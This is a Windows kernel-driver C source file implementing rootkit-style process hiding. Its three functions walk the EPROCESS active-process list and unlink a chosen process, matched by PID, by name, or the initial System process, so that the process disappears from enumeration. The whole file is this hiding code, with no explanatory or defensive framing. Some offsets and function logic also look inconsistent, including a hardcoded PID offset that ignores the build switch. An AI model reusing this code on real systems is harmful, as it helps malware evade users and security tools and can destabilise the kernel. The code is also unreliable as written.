#define WIN732
#ifdef WIN10
#define NAMEOFFSET 0x5a8
#define LINKOFFSET 0x448
#endif
#ifdef WIN732
#define NAMEOFFSET 0x16c
#define LINKOFFSET 0xb8
#endif
#include <ntifs.h>

NTSTATUS HidProcByPid1(ULONG ulPid) {
	//KdBreakPoint();
	DWORD_PTR pEprocess = 0;
	PLIST_ENTRY pListheader = NULL;
	PLIST_ENTRY pNextlist = NULL;
	ULONG ppid = 0;
	pEprocess = (DWORD_PTR)IoGetCurrentProcess();
	pListheader = (PLIST_ENTRY)(pEprocess + LINKOFFSET);
	pNextlist = pListheader->Flink;
	while (pNextlist != pListheader) {
		pEprocess = (DWORD_PTR)((DWORD_PTR)pNextlist - LINKOFFSET);
		ppid = *(ULONG*)(pEprocess + 0x440);
		DbgPrint("PID:%d, ProName:%s\n", ppid, (UCHAR*)(pEprocess + NAMEOFFSET));

		if (ppid == ulPid) {
			DbgPrint("Hide PID:%d, ProName:%s\n", ppid, (UCHAR*)(pEprocess + NAMEOFFSET));
			pNextlist->Blink->Flink = pNextlist->Flink;
			pNextlist->Flink->Blink = pNextlist->Blink;
			return STATUS_SUCCESS;
		}
		pNextlist = pNextlist->Flink;
	}
	return STATUS_SUCCESS;
}

NTSTATUS HidProcByPid2(CHAR* ProcName) {
	KdBreakPoint();
	DWORD_PTR pEprocess = 0;
	PLIST_ENTRY pListheader = NULL;
	PLIST_ENTRY pNextlist = NULL;
	PUCHAR ListProcName = NULL;
	ULONG ppid = 0;
	_asm {
		push eax
		push ebx
		mov ebx, fs: [0x124]   //CurrentThread -- KTHREAD
		mov eax, [ebx + 0x150]
		mov pEprocess, eax
		pop ebx
		pop eax
	}

	ANSI_STRING findstr = { 0 };
	ANSI_STRING listStr = { 0 };
	RtlInitAnsiString(&findstr, ProcName);
	pListheader = (PLIST_ENTRY)(pEprocess + LINKOFFSET);
	pNextlist = pListheader->Flink;
	while (pNextlist != pListheader) {
		pEprocess = (DWORD_PTR)((DWORD_PTR)pNextlist - LINKOFFSET);
		ppid = *(ULONG*)(pEprocess + 0x440);
		DbgPrint("PID:%d, ProName:%s\n", ppid, (UCHAR*)(pEprocess + NAMEOFFSET));
		ListProcName = (PUCHAR)(pEprocess + NAMEOFFSET);
		RtlInitAnsiString(&listStr, ListProcName);
		if ((RtlCompareString(&findstr, &listStr, TRUE)) == 0) {
			DbgPrint("Hide PID:%d, ProName:%s\n", ppid, (UCHAR*)(pEprocess + NAMEOFFSET));
			pNextlist->Blink->Flink = pNextlist->Flink;
			pNextlist->Flink->Blink = pNextlist->Blink;
			return STATUS_SUCCESS;
		}
		pNextlist = pNextlist->Flink;
	}
	return STATUS_SUCCESS;
}

NTSTATUS HidProcByInit() {
	DWORD_PTR pEprocess = (DWORD_PTR)PsInitialSystemProcess;
	PLIST_ENTRY pListheader = NULL;
	PLIST_ENTRY pNextlist = NULL;
	pListheader = (PLIST_ENTRY)(pEprocess + LINKOFFSET);
	pNextlist = pListheader;
	pNextlist->Blink->Flink = pNextlist->Flink;
	pNextlist->Flink->Blink = pNextlist->Blink;
	return STATUS_SUCCESS;
}